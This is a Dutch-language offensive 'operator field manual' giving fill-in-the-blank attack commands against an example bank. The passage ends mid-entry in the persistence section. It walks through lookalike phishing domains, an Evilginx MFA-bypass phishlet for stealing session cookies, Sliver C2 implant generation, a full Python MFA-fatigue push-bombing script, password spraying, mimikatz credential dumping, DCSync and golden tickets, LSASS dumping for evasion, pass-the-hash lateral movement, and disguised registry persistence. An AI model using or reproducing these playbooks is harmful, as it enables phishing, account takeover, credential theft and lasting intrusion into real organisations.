# XPOSE SECURITY — OPERATOR FIELD MANUAL v3.0

## Volledig Geannoteerde Command Reference

**LEGENDE:**
- 🔧 `[AANPASSEN]` = Dit moet je vervangen met jouw waarde
- 📝 Uitleg staat direct onder elk commando
- ⚠️ = Let op / belangrijk

---

# FASE 1: RECONNAISSANCE

## 1.1 EMAIL & SUBDOMAIN DISCOVERY

### theHarvester - Email Adressen Verzamelen

```bash
theHarvester -d [TARGET_DOMAIN] -b all -l 500 -f [OUTPUT_NAAM]
```

**Wat doet dit?**
Zoekt naar email adressen en subdomeinen van het doelwit via zoekmachines, LinkedIn, DNS, etc.

**Aanpassen:**
- `[TARGET_DOMAIN]` → Het domein van je target, bijv. `acme-bank.nl`
- `[OUTPUT_NAAM]` → Naam voor output bestand, bijv. `acme_harvest`

**Voorbeeld:**
```bash
theHarvester -d acme-bank.nl -b all -l 500 -f acme_harvest
```

**Output:** Lijst met gevonden emails zoals `j.devries@acme-bank.nl`, `helpdesk@acme-bank.nl`

---

### Amass - Subdomain Enumeration (Passief)

```bash
amass enum -passive -d [TARGET_DOMAIN] -o [OUTPUT_FILE]
```

**Wat doet dit?**
Vindt subdomeinen ZONDER direct contact met het target (via Certificate Transparency logs, DNS records, etc.)

**Aanpassen:**
- `[TARGET_DOMAIN]` → Target domein, bijv. `acme-bank.nl`
- `[OUTPUT_FILE]` → Output bestand, bijv. `acme_subdomains.txt`

**Voorbeeld:**
```bash
amass enum -passive -d acme-bank.nl -o acme_subdomains.txt
```

**Output:** Subdomeinen zoals `mail.acme-bank.nl`, `vpn.acme-bank.nl`, `portal.acme-bank.nl`

---

### Amass - Subdomain Enumeration (Actief + Bruteforce)

```bash
amass enum -active -d [TARGET_DOMAIN] -brute -o [OUTPUT_FILE]
```

**Wat doet dit?**
Actieve scan + bruteforce van subdomeinen. ⚠️ Dit maakt direct contact met target!

**Aanpassen:**
- `[TARGET_DOMAIN]` → Target domein
- `[OUTPUT_FILE]` → Output bestand

**Voorbeeld:**
```bash
amass enum -active -d acme-bank.nl -brute -o acme_subdomains_brute.txt
```

---

### Subfinder - Snelle Subdomain Scan

```bash
subfinder -d [TARGET_DOMAIN] -all -o [OUTPUT_FILE]
```

**Wat doet dit?**
Snellere alternatief voor Amass, vindt subdomeinen via meerdere bronnen.

**Aanpassen:**
- `[TARGET_DOMAIN]` → Target domein
- `[OUTPUT_FILE]` → Output bestand

**Voorbeeld:**
```bash
subfinder -d acme-bank.nl -all -o acme_subfinder.txt
```

---

## 1.2 DNS ENUMERATION

### Basis DNS Queries

```bash
dig [TARGET_DOMAIN] ANY
```

**Wat doet dit?**
Vraagt ALLE DNS records op voor een domein (A, MX, TXT, NS, etc.)

**Aanpassen:**
- `[TARGET_DOMAIN]` → Target domein

**Voorbeeld:**
```bash
dig acme-bank.nl ANY
```

**Output:** IP adressen, mail servers, nameservers, SPF records

---

### DNS Zone Transfer (vaak geblokkeerd)

```bash
dig axfr [TARGET_DOMAIN] @[NAMESERVER]
```

**Wat doet dit?**
Probeert een volledige kopie van de DNS zone te krijgen. Werkt zelden maar geeft ALLE records als het lukt.

**Aanpassen:**
- `[TARGET_DOMAIN]` → Target domein
- `[NAMESERVER]` → Nameserver van target (vind je met `dig NS [domain]`)

**Voorbeeld:**
```bash
dig axfr acme-bank.nl @ns1.acme-bank.nl
```

---

### DNSRecon - Uitgebreide DNS Scan

```bash
dnsrecon -d [TARGET_DOMAIN] -t std,brt,axfr
```

**Wat doet dit?**
- `std` = Standaard enumeration
- `brt` = Bruteforce subdomeinen
- `axfr` = Zone transfer poging

**Aanpassen:**
- `[TARGET_DOMAIN]` → Target domein

**Voorbeeld:**
```bash
dnsrecon -d acme-bank.nl -t std,brt,axfr
```

---

### Certificate Transparency Logs

```bash
curl -s "https://crt.sh/?q=%.[TARGET_DOMAIN]&output=json" | jq -r '.[].name_value' | sort -u
```

**Wat doet dit?**
Haalt ALLE ooit uitgegeven SSL certificaten op voor het domein. Onthult vaak verborgen subdomeinen.

**Aanpassen:**
- `[TARGET_DOMAIN]` → Target domein

**Voorbeeld:**
```bash
curl -s "https://crt.sh/?q=%.acme-bank.nl&output=json" | jq -r '.[].name_value' | sort -u
```

**Output:** Alle subdomeinen waarvoor ooit een certificaat is aangevraagd

---

## 1.3 SHODAN & GOOGLE DORKS

### Shodan - Zoek op SSL Certificaat

```bash
shodan search "ssl.cert.subject.cn:[TARGET_DOMAIN]"
```

**Wat doet dit?**
Vindt alle servers met een SSL certificaat voor dit domein, inclusief IP, poorten, services.

**Aanpassen:**
- `[TARGET_DOMAIN]` → Target domein

**Voorbeeld:**
```bash
shodan search "ssl.cert.subject.cn:acme-bank.nl"
```

---

### Shodan - Zoek op Organisatie

```bash
shodan search "org:[ORGANISATION_NAME]"
```

**Wat doet dit?**
Vindt alle servers geregistreerd op naam van de organisatie.

**Aanpassen:**
- `[ORGANISATION_NAME]` → Naam zoals geregistreerd in WHOIS, bijv. `ACME Bank NV`

**Voorbeeld:**
```bash
shodan search "org:ACME Bank NV"
```

---

### Google Dorks

```
site:[TARGET_DOMAIN] filetype:pdf
site:[TARGET_DOMAIN] filetype:xlsx
site:[TARGET_DOMAIN] "password" OR "wachtwoord"
site:linkedin.com "[COMPANY_NAME]" "IT" OR "security" OR "helpdesk"
```

**Wat doet dit?**
- Regel 1: Vindt alle PDF's op de website
- Regel 2: Vindt alle Excel bestanden
- Regel 3: Zoekt naar pagina's met "password" of "wachtwoord"
- Regel 4: Vindt IT/security medewerkers op LinkedIn

**Aanpassen:**
- `[TARGET_DOMAIN]` → Target domein
- `[COMPANY_NAME]` → Bedrijfsnaam

**Voorbeeld:**
```
site:acme-bank.nl filetype:pdf
site:acme-bank.nl filetype:xlsx
site:acme-bank.nl "password" OR "wachtwoord"
site:linkedin.com "ACME Bank" "IT" OR "security" OR "helpdesk"
```

---

## 1.4 BREACH DATA ANALYSIS

### HaveIBeenPwned API

```bash
curl "https://haveibeenpwned.com/api/v3/breachedaccount/[EMAIL]" \
  -H "hibp-api-key: [YOUR_API_KEY]"
```

**Wat doet dit?**
Checkt of een email adres voorkomt in bekende datalekken.

**Aanpassen:**
- `[EMAIL]` → Email adres om te checken
- `[YOUR_API_KEY]` → Je HIBP API key (koop op haveibeenpwned.com)

**Voorbeeld:**
```bash
curl "https://haveibeenpwned.com/api/v3/breachedaccount/j.devries@acme-bank.nl" \
  -H "hibp-api-key: abc123def456"
```

---

### Dehashed API

```bash
curl "https://api.dehashed.com/search?query=domain:[TARGET_DOMAIN]" \
  -u [EMAIL]:[API_KEY]
```

**Wat doet dit?**
Zoekt in gelekte databases naar credentials voor het domein. Kan wachtwoorden bevatten!

**Aanpassen:**
- `[TARGET_DOMAIN]` → Target domein
- `[EMAIL]` → Je Dehashed account email
- `[API_KEY]` → Je Dehashed API key

**Voorbeeld:**
```bash
curl "https://api.dehashed.com/search?query=domain:acme-bank.nl" \
  -u myemail@gmail.com:dh_apikey123
```

---

## 1.5 TECHNOLOGY FINGERPRINTING

### Check voor Okta

```bash
curl -s https://[TARGET_DOMAIN].okta.com | grep -i "okta"
```

**Wat doet dit?**
Checkt of het target Okta gebruikt voor identity management.

**Aanpassen:**
- `[TARGET_DOMAIN]` → Target domein (zonder .nl/.com, dus `acme-bank` niet `acme-bank.nl`)

**Voorbeeld:**
```bash
curl -s https://acme-bank.okta.com | grep -i "okta"
```

**Als dit output geeft:** Target gebruikt Okta → Evilginx Okta phishlet gebruiken

---

### Check voor Azure AD / Microsoft 365

```bash
curl -s "https://login.microsoftonline.com/[TARGET_DOMAIN]/.well-known/openid-configuration"
```

**Wat doet dit?**
Checkt of het target Azure AD / Microsoft 365 gebruikt.

**Aanpassen:**
- `[TARGET_DOMAIN]` → Volledig target domein

**Voorbeeld:**
```bash
curl -s "https://login.microsoftonline.com/acme-bank.nl/.well-known/openid-configuration"
```

**Als dit JSON teruggeeft:** Target gebruikt Azure AD → Evilginx O365 phishlet gebruiken

---

### Email Provider Check

```bash
dig MX [TARGET_DOMAIN]
```

**Wat doet dit?**
Toont welke mail servers het domein gebruikt.

**Aanpassen:**
- `[TARGET_DOMAIN]` → Target domein

**Voorbeeld:**
```bash
dig MX acme-bank.nl
```

**Interpretatie:**
- `*.google.com` = Google Workspace
- `*.outlook.com` of `*.protection.outlook.com` = Microsoft 365
- `*.mimecast.com` = Mimecast email security

---

# FASE 2: INFRASTRUCTURE SETUP

## 2.1 DOMAIN REGISTRATIE

### Domeinen om te registreren

Kies domeinen die lijken op het target:

```
[TARGET]-sso.com
[TARGET]-portal.com
[TARGET]-login.com
[TARGET]-mfa.com
[TARGET]-helpdesk.com
[TARGET]-secure.com
[TARGET]support.com (zonder streepje)
```

**Aanpassen:**
- `[TARGET]` → Bedrijfsnaam

**Voorbeeld voor ACME Bank:**
```
acme-bank-sso.com
acme-bank-portal.com
acmebanksupport.com
```

⚠️ Registreer via Namecheap of Porkbun met privacy protection!

---

### Let's Encrypt Certificaat

```bash
certbot certonly --standalone -d [PHISHING_DOMAIN]
```

**Wat doet dit?**
Genereert een gratis SSL certificaat voor je phishing domein.

**Aanpassen:**
- `[PHISHING_DOMAIN]` → Je geregistreerde phishing domein

**Voorbeeld:**
```bash
certbot certonly --standalone -d login.acme-bank-sso.com
```

⚠️ Poort 80 moet open zijn! Stop eerst eventuele webservers.

---

## 2.2 EVILGINX3 SETUP

### Installatie

```bash
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make
sudo ./bin/evilginx -p ./phishlets
```

**Wat doet dit?**
Installeert Evilginx3, een MFA-bypass phishing framework.

---

### Basis Configuratie

```
config domain [PHISHING_DOMAIN]
config ipv4 external [VPS_IP]
```

**Wat doet dit?**
Configureert het basis domein en IP voor Evilginx.

**Aanpassen:**
- `[PHISHING_DOMAIN]` → Je phishing domein (root domein)
- `[VPS_IP]` → Publieke IP van je VPS

**Voorbeeld:**
```
config domain acme-bank-sso.com
config ipv4 external 185.199.123.45
```

---

### Okta Phishlet Activeren

```
phishlets hostname okta [PHISHING_DOMAIN]
phishlets enable okta
```

**Wat doet dit?**
Activeert de Okta phishing pagina op je domein.

**Aanpassen:**
- `[PHISHING_DOMAIN]` → Je phishing domein

**Voorbeeld:**
```
phishlets hostname okta acme-bank-sso.com
phishlets enable okta
```

---

### Lure Aanmaken

```
lures create okta
lures edit 0 redirect_url [LEGITIMATE_OKTA_URL]
lures get-url 0
```

**Wat doet dit?**
Maakt een phishing link aan. Na succesvolle phish wordt slachtoffer doorgestuurd naar echte site.

**Aanpassen:**
- `[LEGITIMATE_OKTA_URL]` → De echte Okta URL van het target

**Voorbeeld:**
```
lures create okta
lures edit 0 redirect_url https://acme-bank.okta.com/app/UserHome
lures get-url 0
```

**Output:** De phishing URL die je naar targets stuurt

---

### Sessions Bekijken

```
sessions
sessions [SESSION_ID]
```

**Wat doet dit?**
- `sessions` = Toont alle gevangen sessies
- `sessions [ID]` = Toont details inclusief cookies/tokens

**Voorbeeld:**
```
sessions
sessions 1
```

**Output:** Session cookies die je kunt gebruiken om in te loggen als het slachtoffer

---

### Custom Okta Phishlet

Maak bestand `/phishlets/okta_[TARGET].yaml`:

```yaml
name: 'okta_[TARGET_NAME]'
author: 'xpose'
min_ver: '3.0.0'

proxy_hosts:
  - {phish_sub: '', orig_sub: '', domain: '[TARGET].okta.com', session: true, is_landing: true}
  - {phish_sub: '', orig_sub: '', domain: 'oktacdn.com', session: false}

sub_filters:
  - {triggers_on: '[TARGET].okta.com', orig_sub: '', domain: '[TARGET].okta.com', 
     search: '[TARGET].okta.com', replace: '{phish_domain}', 
     mimes: ['text/html', 'application/json', 'application/javascript']}

auth_tokens:
  - domain: '[TARGET].okta.com'
    keys: ['sid', 'idx']
  - domain: '.okta.com'
    keys: ['sid', 'idx', 'DT']

credentials:
  username:
    key: 'identifier'
    search: '(.*)'
    type: 'post'
  password:
    key: 'credentials.passcode'
    search: '(.*)'
    type: 'post'

login:
  domain: '[TARGET].okta.com'
  path: '/api/v1/authn'
```

**Aanpassen (4 plekken):**
- `[TARGET_NAME]` → Korte naam, bijv. `acmebank`
- `[TARGET]` → Okta subdomain van target (alles voor `.okta.com`)

**Voorbeeld:** Als target's Okta URL is `acme-bank.okta.com`:
- `[TARGET_NAME]` = `acmebank`
- `[TARGET]` = `acme-bank`

---

## 2.3 C2 INFRASTRUCTURE (SLIVER)

### Installatie

```bash
curl https://sliver.sh/install | sudo bash
```

**Wat doet dit?**
Installeert Sliver C2 framework.

---

### Start Server

```bash
sliver-server
```

**Wat doet dit?**
Start de Sliver C2 server. Alle volgende commando's voer je uit in de Sliver console.

---

### Genereer Windows Implant (.exe)

```
generate --mtls [C2_DOMAIN] --os windows --arch amd64 --format exe --save [OUTPUT_NAME].exe
```

**Wat doet dit?**
Maakt een Windows executable die verbinding maakt met je C2.

**Aanpassen:**
- `[C2_DOMAIN]` → Je C2 domein of IP
- `[OUTPUT_NAME]` → Naam voor de executable

**Voorbeeld:**
```
generate --mtls c2.yourdomain.com --os windows --arch amd64 --format exe --save update.exe
```

---

### Genereer Shellcode

```
generate --mtls [C2_DOMAIN] --os windows --arch amd64 --format shellcode --save [OUTPUT_NAME].bin
```

**Wat doet dit?**
Maakt raw shellcode voor injection in andere processen.

**Aanpassen:**
- `[C2_DOMAIN]` → Je C2 domein
- `[OUTPUT_NAME]` → Output bestandsnaam

**Voorbeeld:**
```
generate --mtls c2.yourdomain.com --os windows --arch amd64 --format shellcode --save payload.bin
```

---

### Start Listeners

```
mtls --lport [PORT]
https --domain [C2_DOMAIN] --lport 443
```

**Wat doet dit?**
- `mtls` = Mutual TLS listener (encrypted, harder to detect)
- `https` = HTTPS listener (looks like normal traffic)

**Aanpassen:**
- `[PORT]` → Poort voor MTLS (bijv. 8888)
- `[C2_DOMAIN]` → Je C2 domein

**Voorbeeld:**
```
mtls --lport 8888
https --domain c2.yourdomain.com --lport 443
```

---

# FASE 3: INITIAL ACCESS

## 3.1 MFA FATIGUE SCRIPT

### Python MFA Bomber voor Okta

```python
#!/usr/bin/env python3
"""
MFA Fatigue Attack Script voor Okta
Stuurt herhaalde push notifications tot gebruiker accepteert
"""

import requests
import time

# ============================================================
# 🔧 AANPASSEN - Vul deze variabelen in:
# ============================================================

OKTA_DOMAIN = "[TARGET].okta.com"        # Bijv: acme-bank.okta.com
API_TOKEN = "[OKTA_API_TOKEN]"           # Okta API token (via phishing admin of andere methode)
TARGET_USER = "[USER_EMAIL_OR_ID]"       # Bijv: j.devries@acme-bank.nl
FACTOR_ID = "[PUSH_FACTOR_ID]"           # Ophalen via get_user_factors()
PUSH_COUNT = 50                          # Aantal push pogingen
DELAY_SECONDS = 3                        # Seconden tussen pushes

# ============================================================

class OktaMFABomber:
    def __init__(self, okta_domain, api_token):
        self.base_url = f"https://{okta_domain}"
        self.headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Authorization': f'SSWS {api_token}'
        }
    
    def get_user_factors(self, user_id):
        """
        Haal alle MFA factors op voor een gebruiker.
        Je hebt de factor_id nodig voor de push.
        """
        resp = requests.get(
            f"{self.base_url}/api/v1/users/{user_id}/factors",
            headers=self.headers
        )
        factors = resp.json()
        
        print("[*] Beschikbare factors:")
        for f in factors:
            print(f"    - ID: {f['id']}, Type: {f['factorType']}, Provider: {f['provider']}")
        
        return factors
    
    def send_push(self, user_id, factor_id):
        """Stuur één push notification."""
        resp = requests.post(
            f"{self.base_url}/api/v1/users/{user_id}/factors/{factor_id}/verify",
            headers=self.headers
        )
        return resp.json()
    
    def bomb(self, user_id, factor_id, count, delay):
        """
        Stuur herhaalde push requests.
        Stop zodra gebruiker accepteert.
        """
        print(f"\n[*] Starting MFA fatigue attack")
        print(f"[*] Target: {user_id}")
        print(f"[*] Pushes: {count}")
        print(f"[*] Delay: {delay}s\n")
        
        for i in range(count):
            result = self.send_push(user_id, factor_id)
            status = result.get('factorResult', 'UNKNOWN')
            
            timestamp = time.strftime("%H:%M:%S")
            print(f"[{timestamp}] Push {i+1}/{count} - Status: {status}")
            
            if status == 'SUCCESS':
                print("\n" + "="*50)
                print("[+] SUCCESS! GEBRUIKER HEEFT GEACCEPTEERD!")
                print("="*50)
                return True
            
            if status == 'REJECTED':
                print("[!] User rejected - wacht even langer...")
                time.sleep(delay * 2)
            else:
                time.sleep(delay)
        
        print("\n[-] Alle pogingen mislukt")
        return False


if __name__ == "__main__":
    bomber = OktaMFABomber(OKTA_DOMAIN, API_TOKEN)
    
    # Stap 1: Haal eerst de factor ID op (eenmalig)
    # bomber.get_user_factors(TARGET_USER)
    
    # Stap 2: Start de aanval (uncomment na invullen FACTOR_ID)
    # bomber.bomb(TARGET_USER, FACTOR_ID, PUSH_COUNT, DELAY_SECONDS)
```

**Aanpassen:**
- `OKTA_DOMAIN` → Okta domein van target (bijv. `acme-bank.okta.com`)
- `API_TOKEN` → Okta API token (verkrijgen via admin phishing of andere access)
- `TARGET_USER` → Email of ID van target user
- `FACTOR_ID` → Push factor ID (eerst `get_user_factors()` runnen)
- `PUSH_COUNT` → Aantal pushes (50 is goed startpunt)
- `DELAY_SECONDS` → Wachttijd tussen pushes (3-5 seconden)

**Gebruik:**
1. Eerst `get_user_factors()` runnen om FACTOR_ID te vinden
2. Dan `bomb()` runnen met de juiste factor ID

---

## 3.2 CREDENTIAL VALIDATION

### Validate Okta Credentials

```bash
curl -X POST "https://[TARGET].okta.com/api/v1/authn" \
  -H "Content-Type: application/json" \
  -d '{"username":"[EMAIL]","password":"[PASSWORD]"}'
```

**Wat doet dit?**
Test of gestolen credentials werken op Okta.

**Aanpassen:**
- `[TARGET]` → Okta subdomain
- `[EMAIL]` → Email van target
- `[PASSWORD]` → Wachtwoord om te testen

**Voorbeeld:**
```bash
curl -X POST "https://acme-bank.okta.com/api/v1/authn" \
  -H "Content-Type: application/json" \
  -d '{"username":"j.devries@acme-bank.nl","password":"Welcome123!"}'
```

**Succesvolle response:** JSON met `sessionToken` en `status: "SUCCESS"` of `"MFA_REQUIRED"`

---

### Validate Microsoft 365 Credentials

```bash
curl -X POST "https://login.microsoftonline.com/common/oauth2/token" \
  -d "grant_type=password" \
  -d "client_id=1b730954-1685-4b74-9bfd-dac224a7b894" \
  -d "resource=https://graph.microsoft.com" \
  -d "username=[EMAIL]" \
  -d "password=[PASSWORD]"
```

**Wat doet dit?**
Test credentials tegen Microsoft 365 / Azure AD.

**Aanpassen:**
- `[EMAIL]` → Email van target
- `[PASSWORD]` → Wachtwoord om te testen

⚠️ `client_id` NIET aanpassen - dit is Microsoft's eigen Azure PowerShell client ID

**Voorbeeld:**
```bash
curl -X POST "https://login.microsoftonline.com/common/oauth2/token" \
  -d "grant_type=password" \
  -d "client_id=1b730954-1685-4b74-9bfd-dac224a7b894" \
  -d "resource=https://graph.microsoft.com" \
  -d "username=j.devries@acme-bank.nl" \
  -d "password=Welcome123!"
```

**Succesvolle response:** JSON met `access_token`
**MFA vereist:** Error `AADSTS50076`

---

### Password Spray met TREVORspray

```bash
trevorspray -u [USERS_FILE] -p '[PASSWORD]' --url https://login.microsoftonline.com
```

**Wat doet dit?**
Test één wachtwoord tegen meerdere gebruikers, met rate-limiting om lockouts te voorkomen.

**Aanpassen:**
- `[USERS_FILE]` → Tekstbestand met één email per regel
- `[PASSWORD]` → Wachtwoord om te proberen

**Voorbeeld:**
```bash
trevorspray -u acme_users.txt -p 'Summer2024!' --url https://login.microsoftonline.com
```

**users.txt formaat:**
```
j.devries@acme-bank.nl
m.jansen@acme-bank.nl
p.bakker@acme-bank.nl
```

---

# FASE 4: POST-EXPLOITATION

## 4.1 SITUATIONAL AWARENESS

### Basis System Info

```powershell
# Wie ben ik?
whoami /all

# Systeem info
systeminfo

# Netwerk info  
ipconfig /all

# Hostname
hostname
```

**Wat doet dit?**
Verzamelt basis informatie over het systeem waarop je bent.

**Geen aanpassingen nodig.**

---

### Domain Enumeration

```powershell
# Alle domain users
net user /domain

# Domain Admins groep
net group "Domain Admins" /domain

# Enterprise Admins groep
net group "Enterprise Admins" /domain

# Alle Domain Controllers
nltest /dclist:[DOMAIN]

# Domain trusts
nltest /domain_trusts
```

**Wat doet dit?**
Verzamelt informatie over het Active Directory domein.

**Aanpassen:**
- `[DOMAIN]` → NetBIOS domain naam (bijv. `ACMEBANK` niet `acme-bank.nl`)

**Voorbeeld:**
```powershell
nltest /dclist:ACMEBANK
```

---

### Netwerk Connecties

```powershell
# Alle connecties
netstat -ano

# Alleen established connecties
Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'}
```

**Wat doet dit?**
Toont alle actieve netwerk verbindingen - handig om te zien waarmee het systeem communiceert.

**Geen aanpassingen nodig.**

---

## 4.2 MIMIKATZ

### Credentials Dumpen uit Geheugen

```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

**Wat doet dit?**
Dumpt alle credentials (wachtwoorden, hashes, tickets) uit het geheugen.

**Vereist:** Administrator rechten

**Output:** Usernames, NTLM hashes, soms plaintext wachtwoorden

---

### SAM Database Dumpen

```powershell
.\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
```

**Wat doet dit?**
Dumpt de lokale SAM database met alle lokale account hashes.

**Vereist:** SYSTEM rechten

---

### DCSync - Alle Domain Hashes

```powershell
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:[DOMAIN] /all /csv" "exit"
```

**Wat doet dit?**
Simuleert een Domain Controller en vraagt alle password hashes op. Dit is de jackpot!

**Vereist:** Domain Admin OF specifieke replication rechten

**Aanpassen:**
- `[DOMAIN]` → FQDN van domein

**Voorbeeld:**
```powershell
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:acme-bank.local /all /csv" "exit"
```

---

### DCSync - Specifieke User

```powershell
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:[DOMAIN] /user:[USERNAME]" "exit"
```

**Wat doet dit?**
Haalt de hash op van één specifieke user.

**Aanpassen:**
- `[DOMAIN]` → FQDN van domein
- `[USERNAME]` → Username (bijv. `Administrator` of `krbtgt`)

**Voorbeeld:**
```powershell
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:acme-bank.local /user:Administrator" "exit"
```

---

### Golden Ticket Aanmaken

```powershell
.\mimikatz.exe "privilege::debug" "kerberos::golden /user:Administrator /domain:[DOMAIN] /sid:[DOMAIN_SID] /krbtgt:[KRBTGT_HASH] /ptt" "exit"
```

**Wat doet dit?**
Maakt een Kerberos ticket dat 10 jaar geldig is en werkt als Administrator. Blijft werken zelfs als wachtwoorden worden gewijzigd!

**Aanpassen:**
- `[DOMAIN]` → FQDN van domein
- `[DOMAIN_SID]` → SID van het domein (krijg je uit DCSync output)
- `[KRBTGT_HASH]` → NTLM hash van krbtgt account (krijg je uit DCSync)

**Voorbeeld:**
```powershell
.\mimikatz.exe "privilege::debug" "kerberos::golden /user:Administrator /domain:acme-bank.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4 /ptt" "exit"
```

---

### Mimikatz Evasion - LSASS Dump via ProcDump

```powershell
# Stap 1: Dump LSASS met Microsoft-signed tool
procdump.exe -ma lsass.exe lsass.dmp

# Stap 2: Exfiltreer lsass.dmp naar je eigen machine

# Stap 3: Analyseer offline met mimikatz
.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
```

**Wat doet dit?**
ProcDump is een Microsoft-signed tool die minder vaak wordt gedetecteerd. Je dumpt LSASS en analyseert het offline.

**Download ProcDump:** https://docs.microsoft.com/en-us/sysinternals/downloads/procdump

---

## 4.3 RUBEUS (KERBEROS ATTACKS)

### Kerberoasting

```powershell
.\Rubeus.exe kerberoast /outfile:[OUTPUT_FILE]
```

**Wat doet dit?**
Vraagt Kerberos service tickets op voor accounts met SPNs. Deze tickets kun je offline kraken.

**Aanpassen:**
- `[OUTPUT_FILE]` → Bestand voor de hashes

**Voorbeeld:**
```powershell
.\Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt
```

**Kraken met Hashcat:**
```bash
hashcat -m 13100 kerberoast_hashes.txt [WORDLIST] -r [RULES]
```

---

### AS-REP Roasting

```powershell
.\Rubeus.exe asreproast /outfile:[OUTPUT_FILE]
```

**Wat doet dit?**
Vindt accounts zonder Kerberos pre-authentication en haalt hun hashes op.

**Aanpassen:**
- `[OUTPUT_FILE]` → Bestand voor de hashes

**Voorbeeld:**
```powershell
.\Rubeus.exe asreproast /outfile:asrep_hashes.txt
```

**Kraken met Hashcat:**
```bash
hashcat -m 18200 asrep_hashes.txt [WORDLIST]
```

---

## 4.4 BLOODHOUND

### Data Collection - SharpHound (Windows)

```powershell
.\SharpHound.exe -c all -d [DOMAIN] --zipfilename [OUTPUT_NAME]
```

**Wat doet dit?**
Verzamelt ALLE informatie over Active Directory voor analyse in BloodHound.

**Aanpassen:**
- `[DOMAIN]` → FQDN van domein
- `[OUTPUT_NAME]` → Naam voor zip bestand

**Voorbeeld:**
```powershell
.\SharpHound.exe -c all -d acme-bank.local --zipfilename acme_bloodhound.zip
```

---

### Data Collection - BloodHound.py (Linux)

```bash
bloodhound-python -u '[USERNAME]' -p '[PASSWORD]' -d [DOMAIN] -ns [DC_IP] -c all
```

**Wat doet dit?**
Hetzelfde als SharpHound maar remote vanaf Linux.

**Aanpassen:**
- `[USERNAME]` → Domain username
- `[PASSWORD]` → Wachtwoord
- `[DOMAIN]` → FQDN van domein
- `[DC_IP]` → IP van een Domain Controller

**Voorbeeld:**
```bash
bloodhound-python -u 'j.devries' -p 'Welcome123!' -d acme-bank.local -ns 10.10.10.1 -c all
```

---

### BloodHound Cypher Queries

**Kortste pad naar Domain Admins:**
```cypher
MATCH p=shortestPath((n:User {name:"[USER]@[DOMAIN]"})-[r*1..]->(m:Group {name:"DOMAIN ADMINS@[DOMAIN]"})) RETURN p
```

**Aanpassen:**
- `[USER]` → Jouw user (UPPERCASE)
- `[DOMAIN]` → Domein (UPPERCASE)

**Voorbeeld:**
```cypher
MATCH p=shortestPath((n:User {name:"J.DEVRIES@ACME-BANK.LOCAL"})-[r*1..]->(m:Group {name:"DOMAIN ADMINS@ACME-BANK.LOCAL"})) RETURN p
```

---

**Alle Kerberoastable Users:**
```cypher
MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames
```

**Geen aanpassingen nodig.**

---

**Computers met Unconstrained Delegation:**
```cypher
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
```

**Geen aanpassingen nodig.**

---

## 4.5 LATERAL MOVEMENT

### Impacket - PsExec (Pass-the-Hash)

```bash
psexec.py [DOMAIN]/[USERNAME]@[TARGET_IP] -hashes :[NTLM_HASH]
```

**Wat doet dit?**
Maakt verbinding met een remote systeem met een NTLM hash (geen wachtwoord nodig).

**Aanpassen:**
- `[DOMAIN]` → Domain naam
- `[USERNAME]` → Username
- `[TARGET_IP]` → IP van target systeem
- `[NTLM_HASH]` → NTLM hash (32 karakters hex)

**Voorbeeld:**
```bash
psexec.py acme-bank.local/administrator@10.10.10.50 -hashes :a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4
```

---

### Impacket - SMBExec (Stealthier)

```bash
smbexec.py [DOMAIN]/[USERNAME]@[TARGET_IP] -hashes :[NTLM_HASH]
```

**Wat doet dit?**
Zoals PsExec maar maakt geen service aan - minder detecteerbaar.

**Aanpassen:** Zelfde als psexec.py

---

### Impacket - WMIExec

```bash
wmiexec.py [DOMAIN]/[USERNAME]@[TARGET_IP] -hashes :[NTLM_HASH]
```

**Wat doet dit?**
Gebruikt WMI voor remote execution - vaak minder gedetecteerd.

**Aanpassen:** Zelfde als psexec.py

---

### Evil-WinRM (WinRM met Hash)

```bash
evil-winrm -i [TARGET_IP] -u [USERNAME] -H [NTLM_HASH]
```

**Wat doet dit?**
WinRM/PowerShell remoting met pass-the-hash.

**Aanpassen:**
- `[TARGET_IP]` → Target IP
- `[USERNAME]` → Username
- `[NTLM_HASH]` → NTLM hash (zonder dubbele punt)

**Voorbeeld:**
```bash
evil-winrm -i 10.10.10.50 -u administrator -H a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4
```

---

### PowerShell Remoting

```powershell
# Maak credential object
$cred = Get-Credential

# Start remote sessie
Enter-PSSession -ComputerName [TARGET] -Credential $cred

# Of voer commando uit
Invoke-Command -ComputerName [TARGET] -Credential $cred -ScriptBlock { whoami }
```

**Aanpassen:**
- `[TARGET]` → Hostname of IP van target

**Voorbeeld:**
```powershell
Enter-PSSession -ComputerName DC01 -Credential $cred
```

---

## 4.6 PERSISTENCE

### Registry Run Key (User Level)

```powershell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v [NAME] /t REG_SZ /d "[PATH_TO_IMPLANT]"
```

**Wat doet dit?**
Start je implant automatisch wanneer de huidige user inlogt.

**Aanpassen:**
- `[NAME]` → Naam voor de registry waarde (kies iets legitiems)
- `[PATH_TO_IMPLANT]` → Volledig pad naar je implant

**Voorbeeld:**
```powershell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsSecurityUpdate" /t REG_SZ /d "C:\Users\Public\update.exe"
```

---

### Registry Run Key (System Level)

```powershell
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v [NAME] /t REG_SZ /d "[PATH_TO_IMPLANT]"
```

**Wat doet dit?**
Start je implant voor ALLE users. Vereist admin rechten.

**Aanpassen:** Zelfde als user level

---

### Scheduled Task

```powershell
schtasks /create /tn "[TASK_NAME]" /tr "[PATH_TO_IMPLANT]" /sc onlogon /ru SYSTEM
```

**Wat doet dit?**
Creëert een scheduled task die je implant start bij login als SYSTEM.

**Aanpassen:**
